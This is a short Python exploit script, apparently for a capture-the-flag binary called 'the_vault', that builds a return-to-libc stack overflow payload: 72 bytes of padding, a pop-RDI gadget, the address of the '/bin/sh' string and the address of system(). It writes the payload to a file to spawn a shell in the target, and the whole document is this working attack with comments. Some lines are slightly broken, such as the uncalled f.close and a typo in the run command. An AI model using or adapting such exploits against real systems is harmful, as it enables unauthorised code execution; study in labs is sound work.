#!/usr/bin/env python
from struct import *
exp = ""
padding = "A"*72
# location of system() in libc
system = pack("Q", 0x7ffff7a72490)
# location in libc of string "/bin/sh"
shell = pack("<Q", 0x7ffff7b943e8)
# gadget to pop string location off of the stack and into RDI
pop = pack("<Q", 0x400753)
# putting it all together
exp += padding+pop+shell+system
# outputting it to a file
# run with (cat; explot; cat) | ./the_vault
f = open("exploit", "w")
f.write(exp)
f.close
exit()
